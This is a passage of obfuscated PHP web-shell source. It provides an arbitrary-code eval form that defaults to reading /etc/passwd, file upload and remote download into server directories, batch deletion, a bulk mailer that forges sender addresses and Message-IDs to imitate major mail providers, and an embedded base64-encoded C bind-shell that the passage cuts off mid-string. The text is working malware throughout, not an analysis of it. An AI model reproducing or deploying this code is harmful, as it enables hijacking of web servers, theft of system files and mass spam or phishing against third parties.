        echo z2b(z9s("302") . (($emsg != '') ? " : " . $emsg : ''));
        echo z5c(array("act" => "sysinfo", "d", "sendlog" => "1"), z10e(z5n() . z7i(z6x(z5u("sysmail", z7x('2', "email"), "0") . z8v(z9s("179"), "7"))) . z5n(), "2"));
    }
}
if ($act == 'eval') {
    if (!@isset($evalsubmit)) {
        $eval_txt = 1;
    } elseif (!@isset($eval_txt)) {
        $eval_txt = 0;
    }
    echo z2b(z9s("182")) . z6d();
    echo z10e(z7i(z6x(z5c(array('act' => 'eval', 'd', 'evalsubmit' => '1'), z5w('eval', '1') . (@isset($eval) ? @htmlspecialchars($eval) : '//readfile("/etc/passwd");' . "\r\n") . z5q() . z9x() . z5x("left", "3") . z8v(z9s("183"), '7', '9') . z5y("eval_txt", z9s("184"), "eval_txt") . z5j()))) . z5n(), '2');
    if (@isset($evalsubmit) && $evalsubmit) {
        $eval = @isset($eval) ? $eval : "";
        if (!@empty($eval)) {
            $eval_result = "";
            $tmp = @ob_get_contents();
            $olddir = @realpath(".") || @getcwd();
            @chdir($d);
            if ($tmp) {
                @ob_clean();
                eval($eval);
                $ret = @ob_get_contents();
                $ret = @convert_cyr_string($ret, "d", "w");
                @ob_clean();
                echo $tmp;
                if ($eval_txt) {
                    $eval_result = @htmlspecialchars($ret);
                } else {
                    $eval_result = $ret;
                }
            } else {
                if ($eval_txt) {
                    $eval_result = @eval($eval);
                } else {
                    $eval_result = $ret;
                }
            }
            @chdir($olddir);
        }
        if ($eval_txt) {
            echo z10e(z7i(z6x(z5w('', '1', 1) . (@isset($eval_result) ? $eval_result : '') . z5q())) . z5n(), '2');
        } else {
            echo $eval_result;
        }
    }
}
if ($act == 'upload') {
    if (z0v($d)) {
        $wdt = (($use_images) ? '<img alt="+" border="0" style="vertical-align: middle; padding-left:2px;" src="?act=i&amp;img=ok">' : z5i("+"));
    } else {
        $wdt = (($use_images) ? '<img alt="x" border="0" style="vertical-align: middle; padding-left:2px;" src="?act=i&amp;img=cancel">' : z8z("x"));
    }
    $a_get = array();
    $ls_a = array();
    $umsg = $mmsg = $rmsg = '';
    if (!@isset($multiupload)) {
        if (@isset($usubmit) && $usubmit) {
            global $_FILES;
            $dest = '';
            if (!@empty($_FILES['file1']['tmp_name'])) {
                $dest = $_FILES['file1']['name'];
            }
            if (@isset($rfile1) && !@empty($rfile1)) {
                $dest = $rfile1;
            }
            if (!@isset($path1) || @empty($path1)) {
                $path1 = $d;
            }

            $path1 = z1a($path1);
            if (!@empty($dest)) {
                if (!@move_uploaded_file($_FILES['file1']['tmp_name'], $path1 . $dest)) {
                    $umsg = z9s("172", array($_FILES['file1']['name'], $_FILES['file1']['tmp_name'], $path1 . $dest));
                } else {
                    $umsg = z9s("173", array($_FILES['file1']['name'], $path1 . $dest));
                    $ls_a[] = $path1 . $dest;
                    $nolsmenu = 1;
                    $act = "ls";
                    $d = $path1;
                }
                $umsg = z10e(z7i(z9j($umsg)));
            }
        }
        echo z2b(z9s("161")) . $umsg . z10e(z5n() . z9f(z9j(z5m(array('act' => 'upload', 'd', 'usubmit' => '1'), z10e(z7i(z5t(z9s("162")) . z9j(z9h('file1', '2') . z8v(z9s("170"), '7') . $wdt)) . z7i(z5t(z9s("163")) . z9j(z6i('rfile1', (@isset($rfile1) ? $rfile1 : ''), "9"))) . z7i(z5t(z9s("164")) . z9j(z6i('path1', (@isset($path1) ? $path1 : $d), "9")))))) . z9j(z5c(array('act' => 'upload', 'd', 'multiupload' => '1'), z10e(z7i(z9j(z8e(z9s("166")) . z6i('lno', ((@isset($lno)) ? $lno : '10'), '1') . z8v(z9s("169"), '7'))))))) . z5n(), '2');
    } else {
        if (@isset($msubmit) && $msubmit) {
            global $_FILES;
            foreach ($_FILES as $fk => $fv) {
                $dest = '';
                if (!@empty($_FILES[$fk]['tmp_name'])) {
                    $dest = $_FILES[$fk]['name'];
                }
                if (@isset($rfile[$fk]) && !@empty($rfile[$fk])) {
                    $dest = $rfile[$fk];
                }
                if (!@isset($mpath) || @empty($mpath)) {
                    $mpath = $d;
                }

                $mpath = z1a($mpath);
                if (!@empty($dest)) {
                    if (!@move_uploaded_file($_FILES[$fk]['tmp_name'], $mpath . $dest)) {
                        $mmsg .= z9s("172", array($_FILES[$fk]['name'], $_FILES[$fk]['tmp_name'], $mpath . $dest)) . z9x();
                    } else {
                        $mmsg .= z9s("173", array($_FILES[$fk]['name'], $mpath . $dest)) . z9x();
                        $ls_a[] = $mpath . $dest;
                        $nolsmenu = 1;
                        $act = "ls";
                        $ftarget = '1';
                        $d = $mpath;
                    }
                }
            }
            if ($mmsg != '') {
                $mmsg = z10e(z7i(z9j($mmsg)));
            }
        }
        $form = '';
        if (!@is_numeric($lno)) {
            $lno = 10;
        }
        for ($i = 0; $i < $lno; $i++) {
            $ii = ($i + 1);
            $form .= z7i(z5t(z9s("162") . " " . $ii) . z9j(z9h('file' . $ii, '2')) . z5t(z9s("163")) . z9j(z6i('rfile[file' . $ii . ']', '', "0")));
        }
        echo z2b(z9s("168")) . $mmsg . z5m(array('act' => 'upload', 'd', 'multiupload' => '1', 'lno', 'msubmit' => '1'), z10e(z5n() . $form) . z10e(z5n() . z7i(z5t(z9s("164")) . z9j(z6i('mpath', (@isset($mpath) ? $mpath : $d), "9") . z8v(z9s("170"), '7') . $wdt)) . z5n()));
    }
    if ($bcurl) {
        $a_get['phpcurl'] = "use php->curl";
    }
    if ($bfsock) {
        $a_get['fsock'] = "use php->fsockopen";
    }
    if (z7r('ini_get') && z8l('allow_url_fopen') && z7r('file_get_contents')) {
        $a_get['file_get_contents'] = "use php->file_get_contents";
    }
    if ($nix && $sh_exec) {
        foreach ($getaliases as $k => $v) {
            if (z8u($k)) {
                $a_get[$k] = "use cmd->$k";
            }
        }
    }
    if (@count($a_get) > 0) {
        if (@isset($rsubmit) && $rsubmit) {
            $fct = '';
            if (!@preg_match(":^(http|https|ftp)\://([a-zA-Z0-9\.\-]+(\:[a-zA-Z0-9\.&%\$\-]+)*@)?((25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])|([a-zA-Z0-9\-]+\.)*[a-zA-Z0-9\-]+\.[a-zA-Z]{2,4})(\:[0-9]+)?(/[^/][a-zA-Z0-9\.\,\?\'\\/\+&%\$#\=~_\-@]*)*$:i", $uploadurl)) {
                $rmsg = z9s("171", $uploadurl);
            } else {
                $dest = z2h($uploadurl);
                if (@isset($nameurl) && !@empty($nameurl)) {
                    $dest = $nameurl;
                }
                if (@empty($dest)) {
                    $dest = 'index.html';
                }
                if (!@isset($rpath) || @empty($rpath)) {
                    $rpath = $d;
                }

                $rpath = z1a($rpath);
                if (z4q($rpath . $dest)) {
                    $i = 1;
                    while (z4q($rpath . $dest)) {
                        if ($i == 1) {
                            $dest = $dest . "." . $i;
                        } else {
                            $dest = @substr($dest, 0, @strlen($dest) - 2) . "." . $i;
                        }
                        $i++;
                    }
                }
                if ($upwith == 'phpcurl' || $upwith == 'fsock' || $upwith == 'file_get_contents') {
                    if ($upwith == 'phpcurl') {
                        $fct = z3a($uploadurl);
                    }
                    if ($upwith == 'fsock') {
                        $fct = z2f($uploadurl);
                    }
                    if ($upwith == 'file_get_contents') {
                        $fct = @file_get_contents($uploadurl);
                    }
                    if (!$fct || @empty($fct)) {
                        $rmsg = z9s("174");
                    } else {
                        if (z9y($rpath . $dest, $fct)) {
                            $rmsg = z9s("176", $rpath . $dest);
                            $ls_a[] = $rpath . $dest;
                            $nolsmenu = 1;
                            $act = "ls";
                            $d = $rpath;
                        } else {
                            $rmsg = z9s("175", $rpath . $dest);
                        }
                    }
                } else {
                    if ($nix && $sh_exec && @isset($getaliases[$upwith])) {
                        $ucmd = @str_replace('[%1%]', $upwith, $getaliases[$upwith]);
                        $ucmd = @str_replace('[%2%]', $uploadurl, $ucmd);
                        $ucmd = @str_replace('[%3%]', $rpath . $dest, $ucmd);
                        z9t($ucmd, 1);
                        if (z4q($rpath . $dest)) {
                            $rmsg = z9s("176", $rpath . $dest);
                            $ls_a[] = $rpath . $dest;
                            $nolsmenu = 1;
                            $act = "ls";
                            $d = $rpath;
                        } else {
                            $rmsg = z9s("174");
                        }
                    }
                }
            }
            if ($rmsg != '') {
                $rmsg = z10e(z7i(z9j($rmsg)));
            }
        }
        echo z2b(z9s("167")) . $rmsg . z5c(array('act' => 'upload', 'd', 'rsubmit' => '1'), z10e(z5n() . z7i(z5t(z9s("165")) . z9j(z6i('uploadurl', (@isset($uploadurl) ? $uploadurl : 'http://'), "0") . z4a('upwith', $a_get, '4', '1') . z8v(z9s("170"), '7') . $wdt)) . z7i(z5t(z9s("163")) . z9j(z6i('nameurl', (@isset($nameurl) ? $nameurl : ''), "9"))) . z7i(z5t(z9s("164")) . z9j(z6i('rpath', (@isset($rpath) ? $rpath : $d), "9"))) . z5n(), '2'));
    }
}
if (@isset($lsall) && @isset($action) && $action != '') {
    $lsall_arr = array();
    $tlsall_arr = @explode("\n", $lsall);
    foreach ($tlsall_arr as $tls) {
        $tls = @trim($tls);
        if (!@empty($tls) && !@in_array($tls, $lsall_arr)) {
            $lsall_arr[] = $tls;
        }
    }
    if (@count($lsall_arr) > 0) {
        foreach ($lsall_arr as $dfls) {
            if (@isset($use_buffer) && $use_buffer && @isset($bcopy) && @isset($bcut) && @is_array($bcopy) && @is_array($bcut)) {
                switch ($action) {
                case 'bcopy':
                    if (!@in_array($dfls, $bcopy)) {
                        z1l($dfls, 'bcopy');
                    }
                    break;
                case 'bcut':
                    if (!@in_array($dfls, $bcut)) {
                        z1l($dfls, 'bcut');
                    }
                    break;
                case 'bunsetcopy':
                    if (@in_array($dfls, $bcopy)) {
                        z1l($dfls, 'bcopy');
                    }
                    break;
                case 'bunsetcut':
                    if (@in_array($dfls, $bcut)) {
                        z1l($dfls, 'bcut');
                    }
                    break;
                case 'bunsetall':
                    if (@in_array($dfls, $bcopy)) {
                        z1l($dfls, 'bcopy');
                    } elseif (@in_array($dfls, $bcut)) {
                        z1l($dfls, 'bcut');
                    }
                    break;
                default:
                    break;
                }
            }
            switch ($action) {
            case 'delete':
                if (z4q($dfls)) {
                    z8d($dfls);
                }
                break;
            default:
                break;
            }
        }
        if (@isset($use_buffer) && $use_buffer) {
            z1w();
        }
    }
}
if ($act == 'mailer') {
    $smsg = $cmsg = '';
    $s_ok = $c_ok = 0;
    if (@isset($m1_submit) && $m1_submit) {
        if (@empty($m1_name) || @empty($m1_from) || @empty($m1_subj) || @empty($m1_msg) || $m1_msg == "message" || @empty($m1_emails) || !@strstr($m1_emails, "@")) {
            $smsg = " : " . z9s("236");
        } else {
            $s_ok = 1;
        }
    } elseif (@isset($m2_submit) && $m2_submit) {
        if (@empty($m2_name) || @empty($m2_from) || @empty($m2_subj) || @empty($m2_msg) || @empty($m2_csv) || !@preg_match('/"(.*?)"\s*,\s*"(.*?)"/', $m2_csv)) {
            $cmsg = " : " . z9s("236");
        } else {
            $c_ok = 1;
        }
    }
    if (!@isset($m1_msg) || @empty($m1_msg)) {
        $m1_msg = "message";
    }
    if (!@isset($m1_emails) || @empty($m1_emails)) {
        $m1_emails = "e-mails";
    }
    if (!@isset($m2_prefix) || @empty($m2_prefix)) {
        $m2_prefix = "column_prefix_";
    }
    if (!@isset($m2_ecol) || !@is_numeric($m2_ecol)) {
        $m2_ecol = "0";
    }
    if (!@isset($m2_msg) || @empty($m2_msg)) {
        $m2_msg = "Hello " . $m2_prefix . "1,\r\n\r\nYour Address: " . $m2_prefix . "2\r\nYour Phone: " . $m2_prefix . "3\r\n\r\nE-mail sent to: " . $m2_prefix . "0";
    }
    if (!@isset($m2_csv) || @empty($m2_csv)) {
        $m2_csv = '"john@email","john","john\'s address","0123456789"' . "\r\n" . '"jane@email","jane","jane\'s address","9876543210"';
    }

    echo z2b(array(z9s("212") . $smsg, z9s("213") . $cmsg), '46');
    echo z9m('2') . z7p() . z7k('', '4');
    echo z10e(z5n() . z9f(z9j(z10e(z5c(array("act" => "mailer", "d", "m1_submit" => "1"), z7i(z9j(z8e(z9s("214"))) . z7e(z5u('m1_name', '', '7'))) . z7i(z9j(z8e(z9s("215"))) . z7e(z5u('m1_from', '', '7'))) . z7i(z9j(z8e(z9s("216"))) . z7e(z5u('m1_subj', '', '7'))) . z7i(z6c(z5w('m1_msg', '3') . $m1_msg . z5q(), '2')) . z7i(z6c(z5w('m1_emails', '3') . $m1_emails . z5q(), '2')) . z7i(z6c(z10e(z7i(z9j(z8e(z9s("217")) . z5u('m1_str', '', '4')) . z9j(z8e(z9s("218")) . z4a('m1_replace', array("" => z9s("223"), "name" => z9s("224"), "email1" => z9s("225"), "email2" => z9s("226"), "emailhash" => z9s("227")), '4', 1)) . z9j(z8e(z9s("219")) . z4a("m1_where", array("subject" => z9s("228"), "message" => z9s("229"), "" => z9s("230")), '5', 1))), '2'), '2')) . z7i(z6c(z10e(z7i(z9j(z5y("m1_rand1", z9s("231"), "m1_rand1"), '', '4') . z9j(z5y("m1_rand2", z9s("232"), "m1_rand2"), '', '4')), '2'), '2')) . z5n() . z7i(z6c(z8v(z9s("233"), '7') . z5y('m1_preview', z9s("234"), 'm1_preview'), '2'))), '2'), '20')) . z5n(), '2');
    echo z7g() . z7k('', '46');
    echo z10e(z5n() . z9f(z9j(z10e(z5c(array('act' => 'mailer', "d", 'm2_submit' => '1'), z7i(z9j(z8e(z9s("214"))) . z7e(z5u('m2_name', '', '7'))) . z7i(z9j(z8e(z9s("215"))) . z7e(z5u('m2_from', '', '7'))) . z7i(z9j(z8e(z9s("216"))) . z7e(z5u('m2_subj', '', '7'))) . z7i(z6c(z5w('m2_msg', '3') . $m2_msg . z5q(), '2')) . z7i(z6c(z5w('m2_csv', '3') . $m2_csv . z5q(), '2')) . z7i(z6c(z10e(z7i(z9j(z8e(z9s("220")) . z6i('m2_ecol', $m2_ecol, '6')) . z9j(z8e(z9s("221")) . z5u('m2_prefix', '', '4')) . z9j(z8e(z9s("222")) . z4a('m2_where', array("message" => z9s("229"), "" => z9s("230")), "4", 1))), '2'), '2')) . z7i(z6c(z10e(z7i(z9j(z5y("m2_rand1", z9s("231"), "m2_rand1"), '', '4') . z9j(z5y("m2_rand2", z9s("232"), "m2_rand2"), '', '4')), '2'), '2')) . z5n() . z7i(z6c(z8v(z9s("233"), '7') . z5y('m2_preview', z9s("234"), "m2_preview") . ' ' . z5y('m2_verbose', z9s("235"), "m2_verbose"), '2'))), '2'), '20')) . z5n(), '2');
    echo z7g() . z7u() . z10w();
    if ($s_ok || $c_ok) {
        $host = array("aol.com", "att.net", "bellsouth.net", "comcast.net", "email.com", "gmail.com", "googlemail.com", "hotmail.com", "juno.com", "live.com", "lycos.com", "mail.com", "mindspring.com", "msn.com", "pacbell.com", "post.com", "prodigy.net", "rocketmail.com", "sbcglobal.net", "usa.com", "yahoo.com", "ymail.com");
        $ch = (@count($host) - 1);
        $i = 1;
        $m_success = 0;
        $m_failed = 0;
        $all_failed = array();
        if ($s_ok) {
            echo z9m('2') . z7i(z9j(z9s("237"), '8', '2') . z9j(z9s("238"), '8') . z9j(z9s("239"), '8') . z9j(z9s("240"), '8') . z9j(z9s("241"), '8', '3'));
            $m_all = @explode("\n", $m1_emails);
            $m_all = @array_unique($m_all);
            $m_count = @count($m_all);
            $m_len = @strlen($m_count);
            z5p();
            foreach ($m_all as $m_mail) {
                $from = $m1_from;
                if (@isset($m1_rand1) && $m1_rand1) {
                    $from = @str_replace("@", @rand(100000, 999999) . "@", $from);
                }
                if (isset($m1_rand2) && $m1_rand2) {
                    $hr = @rand(0, $ch);
                    $m_msgid = @md5(@uniqid(@time())) . "@" . $host[$hr];
                } else {
                    $m_msgid = @md5(@uniqid(@time())) . "@" . $_SERVER["SERVER_NAME"];
                }
                $header = "";
                $header .= "From: $m1_name <$from>\n";
                $header .= "Reply-To: <$from>\n";
                $header .= "Message-ID: <" . $m_msgid . ">\n";
                $header .= "MIME-Version: 1.0\n";
                $date = @date("Y-m-d");
                $header .= "Date: $date\n";
                $header .= "Content-Type: text/html; charset=UTF-8\n";
                $header .= "Content-Transfer-Encoding: 8bit\n\n";
                $m_msg = $m1_msg;
                $m_subj = $m1_subj;
                if (@isset($m1_str) && !@empty($m1_str) && @isset($m1_replace) && !@empty($m1_replace)) {
                    if ($m1_replace == "name") {
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "message") {
                            $m_msg = @str_replace($m1_str, $m1_name, $m_msg);
                        }
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "subject") {
                            $m_subj = @str_replace($m1_str, $m1_name, $m_subj);
                        }
                    } elseif ($m1_replace == "email1") {
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "message") {
                            $m_msg = @str_replace($m1_str, $m1_from, $m_msg);
                        }
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "subject") {
                            $m_subj = @str_replace($m1_str, $m1_from, $m_subj);
                        }
                    } elseif ($m1_replace == "email2") {
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "message") {
                            $m_msg = @str_replace($m1_str, $m_mail, $m_msg);
                        }
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "subject") {
                            $m_subj = @str_replace($m1_str, $m_mail, $m_subj);
                        }
                    } elseif ($m1_replace == "emailhash") {
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "message") {
                            $m_msg = @str_replace($m1_str, @md5($m_mail), $m_msg);
                        }
                        if (!@isset($m1_where) || @empty($m1_where) || $m1_where == "subject") {
                            $m_subj = @str_replace($m1_str, @md5($m_mail), $m_subj);
                        }
                    }
                }
                $m_pad = "";
                if (@strlen($i) < $m_len) {
                    $m_pad = @str_repeat("0", ($m_len-@strlen($i)));
                }
                if (!@empty($m_mail)) {
                    if (@isset($m1_preview) && $m1_preview) {
                        if ($i > 5) {
                            break;
                        }

                        echo z9f(z9j($m_pad . $i, '14', '2') . z9j($m_mail, '14') . z9j($from, '14') . z9j($m_msgid, '14') . z9j(z5i(z9s("245")), '14', '3'), ($i % 2 ? '0' : '1'));
                    } elseif (@mail($m_mail, $m_subj, $m_msg, $header)) {
                        echo z9f(z9j($m_pad . $i, '14', '2') . z9j($m_mail, '14') . z9j($from, '14') . z9j($m_msgid, '14') . z9j(z5i(z9s("243")), '14', '3'), ($i % 2 ? '0' : '1'));
                        z5p();
                        $m_success++;
                    } else {
                        echo z9f(z9j($m_pad . $i, '14', '2') . z9j($m_mail, '14') . z9j($from, '14') . z9j($m_msgid, '14') . z9j(z8z(z9s("244")), '14', '3'), ($i % 2 ? '0' : '1'));
                        z5p();
                        $all_failed[] = $m_mail;
                        $m_failed++;
                    }
                    $i++;
                }
            }
        } elseif ($c_ok) {
            $fcsv = @str_replace("\r", "\n", $m2_csv);
            $fcsv = z3q("\n\n", "\n", $fcsv);
            $csv = z5g($fcsv);
            echo z9m('2') . z7i(z9j(z9s("237"), '8', '2') . z9j(z9s("238"), '8') . z9j(z9s("239"), '8') . ((@isset($m2_verbose) && $m2_verbose) ? z9j(z9s("242"), '8') : '') . z9j(z9s("240"), '8') . z9j(z9s("241"), '8', '3'));
            $m_count = @count($csv);
            $m_len = @strlen($m_count);
            z5p();
            foreach ($csv as $str_csv) {
                if (@is_array($str_csv)) {
                    $from = $m2_from;
                    $m_mail = $str_csv[$m2_ecol];
                    if (@isset($m2_rand1) && $m2_rand1) {
                        $from = @str_replace("@", @rand(100000, 999999) . "@", $from);
                    }
                    if (isset($m2_rand2) && $m2_rand2) {
                        $hr = @rand(0, $ch);
                        $m_msgid = @md5(@uniqid(@time())) . "@" . $host[$hr];
                    } else {
                        $m_msgid = @md5(@uniqid(@time())) . "@" . $_SERVER["SERVER_NAME"];
                    }
                    $header = "";
                    $header .= "From: $m2_name <$from>\n";
                    $header .= "Reply-To: <$from>\n";
                    $header .= "Message-ID: <" . $m_msgid . ">\n";
                    $header .= "MIME-Version: 1.0\n";
                    $date = @date("Y-m-d");
                    $header .= "Date: $date\n";
                    $header .= "Content-Type: text/html; charset=UTF-8\n";
                    $header .= "Content-Transfer-Encoding: 8bit\n\n";
                    $m_msg = $m2_msg;
                    $m_subj = $m2_subj;
                    $repl = array();
                    for ($si = (@count($str_csv) - 1); $si >= 0; $si--) {
                        if (@empty($m2_where)) {
                            $m_msg = @str_replace($m2_prefix . $si, $str_csv[$si], $m_msg);
                            $m_subj = @str_replace($m2_prefix . $si, $str_csv[$si], $m_subj);
                            $repl[] = $m2_prefix . $si . " = " . $str_csv[$si] . z9x();
                        } else {
                            $m_msg = @str_replace($m2_prefix . $si, $str_csv[$si], $m_msg);
                            $repl[] = $m2_prefix . $si . " = " . $str_csv[$si] . z9x();
                        }
                    }
                    $replacing = (@count($repl) > 0 ? @implode('', @array_reverse($repl)) : '');
                    $m_pad = "";
                    if (@strlen($i) < $m_len) {
                        $m_pad = @str_repeat("0", ($m_len-@strlen($i)));
                    }
                    if (!@empty($m_mail)) {
                        if (@isset($m2_preview) && $m2_preview) {
                            if ($i > 5) {
                                break;
                            }

                            echo z9f(z9j($m_pad . $i, '14', '2') . z9j($m_mail, '14') . z9j($from, '14') . ((@isset($m2_verbose) && $m2_verbose) ? z9j($replacing, '14') : '') . z9j($m_msgid, '14') . z9j(z5i(z9s("245")), '14', '3'), ($i % 2 ? '0' : '1'));
                        } elseif (@mail($m_mail, $m_subj, $m_msg, $header)) {
                            echo z9f(z9j($m_pad . $i, '14', '2') . z9j($m_mail, '14') . z9j($from, '14') . ((@isset($m2_verbose) && $m2_verbose) ? z9j($replacing, '14') : '') . z9j($m_msgid, '14') . z9j(z5i(z9s("243")), '14', '3'), ($i % 2 ? '0' : '1'));
                            z5p();
                            $m_success++;
                        } else {
                            echo z9f(z9j($m_pad . $i, '14', '2') . z9j($m_mail, '14') . z9j($from, '14') . ((@isset($m2_verbose) && $m2_verbose) ? z9j($replacing, '14') : '') . z9j($m_msgid, '14') . z9j(z8z(z9s("244")), '14', '3'), ($i % 2 ? '0' : '1'));
                            z5p();
                            $all_failed[] = $m_mail;
                            $m_failed++;
                        }
                        $i++;
                    }
                }
            }
            echo z10w();
        }
        if (!@isset($m2_preview) || !$m2_preview) {
            echo z6d() . z10e(z7i(z6x(z9s("426", $m_count) . z9c() . z9s("427", $m_success) . z9c() . z9s("428", $m_failed) . ($m_failed > 0 ? z9c() . z9s("431") : ''))), '2');
            if (@count($all_failed) > 0) {
                echo z10e(z9f(z6x(z5w('', '1', 1) . @implode("\n", @array_unique($all_failed)) . z5q())), '2');
            }
        }
    }
}
if ($act == 'encoders') {
    $hash_algos = array('' => z9s("260"));
    if (!@isset($hash_input)) {
        $hash_input = '';
    }
    if (z7r("hash_algos") && @z7r("hash")) {
        $hfnc = 1;
        $hashes = @hash_algos();
    } else {
        $hfnc = 0;
        $hashes = array();
        foreach (array("md5", "sha1", "crc32") as $hh) {
            if (z7r($hh)) {
                $hashes[] = $hh;
            }
        }
    }
    foreach ($hashes as $ha) {
        $hash_algos[$ha] = $ha;
    }

    $encode_functions = z0x();
    $submited = 0;
    if (@isset($submit_encode) && $submit_encode && @isset($encoder_input) && !@empty($encoder_input)) {
        $submited = 1;
    }

    $encoder_output = "";
    if (!@isset($ip_input) || @empty($ip_input)) {
        $ip_input = $saddr;
    }
    echo z2b(array(z9s("246"), z9s("253")), "46");
    echo z9m(2) . z7p() . z7k('', '4') . z6d() . z9m('2') . z9l('', 'hash_form') . z9b("act", "encoders") . z9b("d") . z9b("htype", "1") . z7i(z5t(z9s("247")) . z9j(z5u("hashinput", "", "5") . z8v(z9s("248"), '7') . z8m(z9s("250"), 'document.hash_form.hashinput.value=\'\';', '7'))) . z9z() . z10w();
    if (@isset($htype) && $htype) {
        echo z10e(z9f(z5t(z9s("251")) . z9j(z5w('', '6') . z2k($hashinput) . z5q())), "2");
    }
    echo z7g() . z7k('', '46') . z6d() . z9m('2') . z9l('', "ip_form") . z9b("act", "encoders") . z9b("d") . z9b("submit_ip", "1") . z7i(z5t(z9s("254")) . z9j(z6i("ip_input", @htmlspecialchars($ip_input), '5') . z8v(z9s("248"), '7') . z8m(z9s("250"), 'document.ip_form.ip_input.value=\'\';', '7'))) . z9z() . z10w();
    if (@isset($submit_ip) && $submit_ip == "1" && @isset($ip_input) && !@empty($ip_input)) {
        echo z9m('2') . z7i(z5t(z9s("255")) . z9j(z8h(sprintf("%u", @ip2long($ip_input)), "0") . z9c() . z10y('http://' . @sprintf("%u", @ip2long($ip_input)) . '/', z9s("252"), "1", 1))) . z7i(z5t(z9s("256")) . z9j(z8h((z2n($ip_input) == "failed") ? "failed" : z2n($ip_input), "0") . ((z2n($ip_input) == "failed") ? "" : z9c() . z10y('http://' . z2n($ip_input) . '/', z9s("252"), "1", 1)))) . z7i(z5t(z9s("257")) . z9j(z8h((z1h($ip_input) == "failed") ? "failed" : z1h($ip_input), "0") . ((z1h($ip_input) == "failed") ? "" : z9c() . z10y('http://' . z1h($ip_input) . '/', z9s("252"), "1", 1)))) . z10w();
    }
    echo z6d();
    echo z7g() . z7u() . z10w();
    echo z2b(array(z9s("432"), z9s("433")), '46');
    echo z9m(2) . z7p() . z7k('', '4') . z6d() . z9m('2') . z9l('', "hashing_form") . z9b("act", "encoders") . z9b("d") . z7i(z5t(z9s("258")) . z9j(z4a('hash_type', $hash_algos, '5', 1) . z8v(z9s("249"), '7') . z8m(z9s("250"), 'document.hashing_form.hash_input.value=\'\';', '7'))) . z9f(z5t(z9s("259")) . z9j(z5w('hash_input', '6') . (@isset($hash_input) ? @htmlspecialchars($hash_input) : '') . z5q())) . z9z() . z10w() . z6d() . z7g() . z7k('', '46') . z6d() . z9m('2') . z9l('', "encoder_form") . z9b("d") . z9b("act", "encoders") . z9b("submit_encode", "1") . z7i(z5t(z9s("91")) . z9j(z4a("encode_selected", $encode_functions, "5", 1, '') . z8v(z9s("249"), '7') . z8m(z9s("250"), 'document.encoder_form.encoder_input.value=\'\';', '7'))) . z9f(z5t(z9s("259")) . z9j(z5w('encoder_input', '6') . (@isset($encoder_input) ? @htmlspecialchars($encoder_input) : '') . z5q())) . ($submited ? z7i(z5t(z9c()) . z9j(z8m(z9s("263"), 'document.output_form.encoder_output.value=\'\';', '7') . z8m(z9s("264"), 'document.encoder_form.encoder_input.value=document.output_form.encoder_output.value;', '7'))) : '') . z9z() . z10w() . z6d() . z7g() . z7u() . z10w();
    if (@isset($hash_input) && !@empty($hash_input)) {
        echo z2b(z9s("261")) . z6d();
        echo z9m('2');
        if (@count($hashes) > 0) {
            if (@isset($hash_type) && @in_array($hash_type, $hashes)) {
                echo z7i(z5t($hash_type) . z9j(z8h(($hfnc ? @hash($hash_type, $hash_input) : $hash_type($hash_input)), '7')));
            } else {
                foreach ($hashes as $k) {
                    echo z7i(z5t($k) . z9j(z8h(($hfnc ? @hash($k, $hash_input) : $k($hash_input)), '7')));
                }
            }
        }
        echo z10w() . z6d();
    }
    if ($submited) {
        $encoder_output = $encode_selected($encoder_input);
        echo z2b(z9s("262")) . z6d() . z9m('2') . z9l('', "output_form") . z9f(z6x(z5w('encoder_output', '1') . @htmlspecialchars($encoder_output) . z5q())) . z9z() . z10w() . z6d();
    }
}
if ($act == 'tools') {
    $bndprt_c = "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8c3RyaW5ncy5oPgojaW5jbHVkZSA8bmV0aW5ldC9pbi5oPgojaW5jbHVkZSA8c3lzL3NvY2tldC5oPgojaW5jbHVkZSA8c2lnbmFsLmg+CgojZGVmaW5lIFAwUlQgJXBvcnQlCiNkZWZpbmUgUEFTUyAiJXBhc3MlIgoKaW50Cm1haW4oaW50IGEsIGNoYXIgKipiKQp7CmludCBjLCBkLCBlID0gc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcl9pbiksIGY7CmNoYXIgcFsxMDAwXTsKc3RydWN0IHNvY2thZGRyX2luIGwsIHI7CnNpZ25hbChTSUdDSExELCBTSUdfSUdOKTsKc2lnbmFsKFNJR0hVUCwgU0lHX0lHTik7CnNpZ25hbChTSUdURVJNLCBTSUdfSUdOKTsKc2lnbmFsKFNJR0lOVCwgU0lHX0lHTik7CmlmIChmb3JrKCkpCmV4aXQoMCk7Cmwuc2luX2ZhbWlseSA9IEFGX0lORVQ7Cmwuc2luX3BvcnQgPSBodG9ucyhQMFJUKTsKbC5zaW5fYWRkci5zX2FkZHIgPSBJTkFERFJfQU5ZOwpiemVybygmKGwuc2luX3plcm8pLCA4KTsKYyA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgMCk7CmJpbmQoYywoc3RydWN0IHNvY2thZGRyICopICZsLCBzaXplb2Yoc3RydWN0IHNvY2thZGRyKSk7Cmxpc3RlbihjLCAzKTsKd2hpbGUgKChkID0gYWNjZXB0KGMsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnIsICZlKSkpCnsKaWYgKCFmb3JrKCkpCnsKcmVjdihkLCBwLCAxMDAwLCAwKTsKaWYgKGNocGFzcyhQQVNTLHApKQp7CmNsb3NlKGQpOwpleGl0KDEpOwp9CmNsb3NlKDApOwpjbG9zZSgxKTsKY2xvc2UoMik7CmR1cDIoZCwgMCk7CmR1cDIoZCwgMSk7CmR1cDIoZCwgMik7C